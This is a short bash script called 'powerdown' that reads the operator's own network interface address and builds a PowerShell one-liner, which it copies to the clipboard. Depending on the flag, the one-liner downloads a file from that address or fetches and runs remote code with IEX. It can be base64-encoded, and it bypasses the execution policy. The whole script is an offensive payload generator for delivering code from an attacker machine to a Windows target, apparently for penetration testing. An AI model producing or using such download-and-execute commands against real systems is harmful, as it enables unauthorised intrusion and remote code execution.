#!/bin/bash

function usage {
    echo "Usage: powerdown -r/-d [-b64] <interface> <port> <filename>"
    exit
}

if [ $# -lt 4 ]; then
    usage
fi

ARGS=$(getopt -o "rd" -l base64 -- "$@")
eval set -- "$ARGS"

while true; do
    case "$1" in 
        -r) method="run";shift;;
        -d) method="download";shift;;
        --base64) b64=1;shift;;
        --) shift; break;;
        *) break;;
    esac
done

interface=$1
port=$2
filename=$3
ip=$(ifconfig $interface | grep -oP 'inet \d+\.\d+\.\d+\.\d+' | cut -d ' ' -f 2)
remote="http://$ip:$port/$filename"

if [ $method == 'run' ]
then
    cmd="IEX(new-object System.Net.WebClient).DownloadString('$remote')"
elif [ $method == 'download' ]
then
    outfile=$(echo $filename | rev | cut -d '/' -f 1 | rev)
    cmd="(new-object System.Net.WebClient).DownloadFile('$remote','$outfile')"
fi

if [ $b64 ]
then
    b64_cmd=$(echo -n $cmd | iconv -f ASCII -t UTF-16LE | base64 -w 0)
    clipped="powershell -nop -ep bypass -e $b64_cmd"
else
    clipped="powershell -nop -ep bypass -c \"$cmd\""
fi

echo $clipped
echo -n $clipped | xclip -in -sel c
echo ""
echo "Command copied to clipboard"
